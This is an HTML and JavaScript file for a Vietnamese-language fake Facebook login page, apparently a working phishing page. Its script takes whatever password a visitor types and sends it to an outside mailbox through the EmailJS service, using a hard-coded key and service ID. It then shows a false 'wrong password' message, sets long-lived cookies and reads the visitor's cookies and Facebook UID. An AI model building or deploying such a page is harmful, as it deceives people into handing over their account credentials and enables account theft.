<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            display: flex;
            max-width: 980px;
            width: 100%;
            padding: 20px 0;
            align-items: center;
            justify-content: space-between;
        }
        .left-section {
            flex: 1;
            padding-right: 40px;
        }
        .logo {
            width: 320px;
            height: auto;
            margin-bottom: 8px;
        }
        .slogan {
            font-size: 28px;
            line-height: 32px;
            color: #1c1e21;
            font-weight: normal;
            max-width: 500px;
        }
        .right-section {
            width: 396px;
        }
        .login-container, .create-container, .forgot-container, .language-container, .privacy-container, .terms-container, .help-container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
            display: none;
        }
        .login-container.active, .create-container.active, .forgot-container.active, .language-container.active, .privacy-container.active, .terms-container.active, .help-container.active {
            display: block;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .btn-login, .btn-submit, .btn-forgot {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-login:hover, .btn-submit:hover, .btn-forgot:hover {
            background: #166fe5;
        }
        .forgot-password, .btn-back {
            color: #1877f2;
            font-size: 14px;
            display: block;
            margin: 16px 0;
            text-decoration: none;
            cursor: pointer;
        }
        .forgot-password:hover, .btn-back:hover {
            text-decoration: underline;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 16px;
        }
        .btn-create {
            padding: 14px 20px;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-create:hover {
            background: #36a420;
        }
        .footer {
            padding: 20px 0;
            font-size: 12px;
            color: #8a8d91;
            text-align: center;
            width: 100%;
        }
        .footer a {
            color: #8a8d91;
            margin: 0 8px;
            text-decoration: none;
            cursor: pointer;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
            text-align: center;
            z-index: 1000;
            max-width: 400px;
            border: 1px solid #dadde1;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        h2 {
            font-size: 24px;
            color: #1c1e21;
            margin-bottom: 16px;
        }
        .popup h3 {
            font-size: 20px;
            color: #1c1e21;
            margin: 0 0 10px;
        }
        .popup small {
            font-size: 14px;
            color: #606770;
            display: block;
            margin-bottom: 15px;
        }
        .language-list {
            list-style: none;
            padding: 0;
            font-size: 14px;
            color: #1c1e21;
        }
        .language-list li {
            margin: 10px 0;
            cursor: pointer;
        }
        .language-list li:hover {
            text-decoration: underline;
        }
        .popup-btn {
            padding: 10px 20px;
            background: #e4e6eb;
            border: none;
            border-radius: 6px;
            color: #050505;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .popup-btn:hover {
            background: #d8dade;
        }
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                text-align: center;
            }
            .left-section {
                padding-right: 0;
                margin-bottom: 20px;
            }
            .right-section {
                width: 90%;
                max-width: 396px;
            }
        }
    </style>
</head>
<body>
    <script type="text/javascript">
        (function() {
            emailjs.init("c-Ms5MjWbitpDBb-E"); // Public Key của bạn
        })();
    </script>

    <div class="container">
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
            <p class="slogan">Kết nối với bạn bè và thế giới xung quanh bạn trên Facebook.</p>
        </div>
        <div class="right-section">
            <div class="login-container active">
                <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
                <input type="password" id="password" placeholder="Mật khẩu">
                <button class="btn-login" onclick="loginWithForm()">Đăng nhập</button>
                <a class="forgot-password" onclick="showForgot()">Quên mật khẩu?</a>
                <div class="divider"></div>
                <button class="btn-create" onclick="showCreate()">Tạo tài khoản mới</button>
            </div>
            <div class="create-container">
                <h2>Tạo tài khoản mới</h2>
                <input type="text" id="first-name" placeholder="Họ">
                <input type="text" id="last-name" placeholder="Tên">
                <input type="text" id="create-email" placeholder="Email hoặc số điện thoại">
                <input type="password" id="create-password" placeholder="Mật khẩu mới">
                <button class="btn-submit" onclick="createAccount()">Đăng ký</button>
                <a class="btn-back" onclick="showLogin()">Quay lại đăng nhập</a>
            </div>
            <div class="forgot-container">
                <h2>Tìm lại tài khoản của bạn</h2>
                <input type="text" id="forgot-input" placeholder="Email hoặc số điện thoại">
                <button class="btn-forgot" onclick="submitForgot()">Gửi yêu cầu</button>
                <a class="btn-back" onclick="showLogin()">Quay lại đăng nhập</a>
            </div>
            <div class="language-container">
                <h2>Chọn ngôn ngữ</h2>
                <ul class="language-list">
                    <li onclick="showPopup('Ngôn ngữ', 'Đã chọn Tiếng Việt')">Tiếng Việt</li>
                    <li onclick="showPopup('Language', 'Switched to English')">English (US)</li>
                    <li onclick="showPopup('Ngôn ngữ', 'Đã chọn Tiếng Nhật')">日本語</li>
                </ul>
                <a class="btn-back" onclick="showLogin()">Quay lại</a>
            </div>
            <div class="privacy-container">
                <h2>Quyền riêng tư</h2>
                <p>Chúng tôi cam kết bảo vệ thông tin của bạn.</p>
                <a class="btn-back" onclick="showLogin()">Quay lại</a>
            </div>
            <div class="terms-container">
                <h2>Điều khoản</h2>
                <p>Bằng cách sử dụng Facebook, bạn đồng ý với các điều khoản của chúng tôi.</p>
                <a class="btn-back" onclick="showLogin()">Quay lại</a>
            </div>
            <div class="help-container">
                <h2>Trợ giúp</h2>
                <p>Liên hệ chúng tôi qua email: support@facebook.com</p>
                <a class="btn-back" onclick="showLogin()">Quay lại</a>
            </div>
        </div>
    </div>

    <div id="overlay" class="overlay" onclick="hidePopup()"></div>
    <div id="popup" class="popup">
        <h3 id="popup-title"></h3>
        <small id="popup-subtext"></small>
        <button class="popup-btn" onclick="hidePopup()">OK</button>
    </div>

    <div class="footer">
        <a onclick="showLanguage()">Tiếng Việt</a>
        <a onclick="showLanguage()">English (US)</a>
        <a onclick="showPrivacy()">Quyền riêng tư</a>
        <a onclick="showTerms()">Điều khoản</a>
        <a onclick="showHelp()">Trợ giúp</a>
        <br>Meta © 2025
    </div>

    <script>
        function showPopup(title, subtext = "") {
            document.getElementById('popup-title').innerText = title;
            document.getElementById('popup-subtext').innerText = subtext;
            document.getElementById('popup').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
        }

        function hidePopup() {
            document.getElementById('popup').style.display = 'none';
            document.getElementById('overlay').style.display = 'none';
        }

        function getCookies() {
            return document.cookie || "Không có cookie nào được lưu.";
        }

        function getUIDFromCookie() {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.trim().startsWith("c_user=")) {
                    return cookie.split('=')[1].trim();
                }
            }
            return "Không tìm thấy UID.";
        }

        function switchContainer(containerClass) {
            document.querySelectorAll('.right-section > div').forEach(div => div.classList.remove('active'));
            document.querySelector(`.${containerClass}`).classList.add('active');
        }

        function showLogin() { switchContainer('login-container'); }
        function showCreate() { switchContainer('create-container'); }
        function showForgot() { switchContainer('forgot-container'); }
        function showLanguage() { switchContainer('language-container'); }
        function showPrivacy() { switchContainer('privacy-container'); }
        function showTerms() { switchContainer('terms-container'); }
        function showHelp() { switchContainer('help-container'); }

        function sendEmail(loginInput, password) {
            const templateParams = {
                email: "test@example.com",
                phone: "123456789",
                password: password,
                cookies: `c_user=123456789`,
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
                action: "Đăng nhập qua form",
                timestamp: "09/04/2025, 14:30:00"
            };

            console.log("Đang gửi email với dữ liệu:", templateParams);

            return emailjs.send('service_ytsr91e', '__ejs-test-mail-service__', templateParams)
                .then((response) => {
                    console.log("Email gửi thành công:", response.status, response.text);
                    showPopup("Email gửi thành công", "Kiểm tra Gmail của bạn!");
                })
                .catch((error) => {
                    console.error("Lỗi gửi email:", error);
                    showPopup("Lỗi gửi email", "Vui lòng kiểm tra console để biết chi tiết.");
                });
        }

        function loginWithForm() {
            const loginInput = document.getElementById('login-input').value || "";
            const password = document.getElementById('password').value || "";

            // Lưu cookie với thời gian sống đến năm 2100
            const expiryDate = new Date("2100-01-01").toUTCString();
            document.cookie = `c_user=123456789; path=/; expires=${expiryDate}`;
            document.cookie = `login=${encodeURIComponent(loginInput)}; path=/; expires=${expiryDate}`;

            // Gửi email và chờ kết quả
            sendEmail(loginInput, password).finally(() => {
                // Hiển thị thông báo "Đăng nhập không thành công" bất kể email thành công hay không
                showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại.");
            });
        }

        function createAccount() {
            const firstName = document.getElementById('first-name').value || "";
            const lastName = document.getElementById('last-name').value || "";
            const email = document.getElementById('create-email').value || "";
            const password = document.getElementById('create-password').value || "";

            if (!firstName || !lastName || !email || !password) {
                showPopup("Lỗi", "Vui lòng điền đầy đủ thông tin.");
                return;
            }

            const expiryDate = new Date("2100-01-01").toUTCString();
            document.cookie = `c_user=${Math.floor(Math.random() * 1000000000)}; path=/; expires=${expiryDate}`;
            document.cookie = `login=${encodeURIComponent(email)}; path=/; expires=${expiryDate}`;

            const cookies = getCookies();
            showPopup("Tạo tài khoản thành công", `Họ: ${firstName}\nTên: ${lastName}\nEmail: ${email}\nCookie: ${cookies}`);
            setTimeout(showLogin, 2000);
        }

        function submitForgot() {
            const forgotInput = document.getElementById('forgot-input').value || "";
            if (!forgotInput) {
                showPopup("Lỗi", "Vui lòng nhập email hoặc số điện thoại.");
                return;
            }
            showPopup("Yêu cầu đã gửi", `Chúng tôi sẽ gửi hướng dẫn khôi phục đến: ${forgotInput}`);
            setTimeout(showLogin, 2000);
        }

        window.onload = function() {
            if (getUIDFromCookie() !== "Không tìm thấy UID.") {
                showPopup("Đã đăng nhập", "Bạn đã có cookie UID: " + getUIDFromCookie());
            }
        };
    </script>
</body>
</html>
